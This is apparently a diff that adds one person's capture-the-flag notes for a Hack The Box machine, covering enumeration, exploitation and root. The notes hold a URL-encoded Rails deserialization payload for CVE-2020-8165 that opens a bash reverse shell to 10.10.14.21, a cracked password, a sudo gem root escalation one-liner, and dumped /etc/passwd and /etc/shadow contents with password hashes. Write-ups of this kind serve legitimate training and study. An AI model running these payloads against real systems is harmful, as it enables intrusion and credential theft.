@@ -1,0 +1,192 @@
+
+
+web:8080
+web:8000
+ssh:22
+
+
+					web on 8080
+
+*possible cred
+user:jennifer
+
+*not really anything here
+
+					
+
+
+
+
+
+					web on 8000
+
+<!-- git web interface version 2.20.1, (C) 2005-2006, Kay Sievers <kay.sievers@vrfy.org>, Christian Gierke -->
+
+*possible creds
+
+user:kay
+user:christian/chris
+
+
+*gitweb 
+
+
+					enum
+
+*sus bd.sql
+
+found cred
+user:jennifer/jennifer@mail.htb
+
+*password looks hashed
+
+
+
+*sus rails?
+
+*found possible CVE
+
+CVE-2020-8165
+
+
+
+
+
+
+					exploitation
+
+
+https://github.com/masahiro331/CVE-2020-8165
+
+*modify "code" to spawn a netcat shell
+
+payload = %04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3F%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.21%2F1337+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
+		
+*nc listener 
+
+*sign up, login
+
+*update user profile:
+method="post"><input name="utf8"
+
+*use burp to send payload (in username field) w/ reapeater
+
+*turn off intercept before you send unless you want a bad time lol
+
+
+
+
+					privesc
+
+*linpeas found hashes in a database
+
+/var/backups/dump_2020-08-27.sql
+
+
+
+
+					hashing
+
+
+*identfy
+
+Your hash may be one of the following:
+- Blowfish(OpenBSD)
+- Woltlab Burning Board 4.x
+- bcrypt
+
+
+pass:spongebob
+
+
+					
+					privesc 
+
+*wierd google auth
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+*need google auth for sudo -l
+*need to sync time
+
+(ALL : ALL) /usr/bin/gem
+
+
+*trusty gtfobins
+sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+
+
+
+
+
+
+
+					shits and gigs
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+bill:x:1000:1000:,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+postgres:x:108:115:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+redis:x:109:116::/var/lib/redis:/usr/sbin/nologin
+
+
+
+root:$6$YwD1cSpUyJrGkFRp$.IYGkOtaiuUWp4rqZc04oC2/GxrwiVxelP2qLSpL8POlusU/5PTjZ4SIJMTqdsOJCbz7ubQAVk3QUiJuHJlj30:18502:0:99999:7:::
+daemon:*:18500:0:99999:7:::
+bin:*:18500:0:99999:7:::
+sys:*:18500:0:99999:7:::
+sync:*:18500:0:99999:7:::
+games:*:18500:0:99999:7:::
+man:*:18500:0:99999:7:::
+lp:*:18500:0:99999:7:::
+mail:*:18500:0:99999:7:::
+news:*:18500:0:99999:7:::
+uucp:*:18500:0:99999:7:::
+proxy:*:18500:0:99999:7:::
+www-data:*:18500:0:99999:7:::
+backup:*:18500:0:99999:7:::
+list:*:18500:0:99999:7:::
+irc:*:18500:0:99999:7:::
+gnats:*:18500:0:99999:7:::
+nobody:*:18500:0:99999:7:::
+_apt:*:18500:0:99999:7:::
+systemd-timesync:*:18500:0:99999:7:::
+systemd-network:*:18500:0:99999:7:::
+systemd-resolve:*:18500:0:99999:7:::
+messagebus:*:18500:0:99999:7:::
+avahi-autoipd:*:18500:0:99999:7:::
+sshd:*:18500:0:99999:7:::
+bill:$6$C44ohagxkeepLCLJ$.nEHGSvbi4l0RaWrRyVaOaMClPoYEhSMLQmQSzQHjEQDJ2dL8KPS.f9jBMX.skn8ZwXYtl6q.4CbVHeFBLPWV0:18501:0:99999:7:::
+systemd-coredump:!!:18500::::::
+usbmux:*:18500:0:99999:7:::
+postgres:*:18500:0:99999:7:::
+redis:*:18500:0:99999:7:::
+
+
+
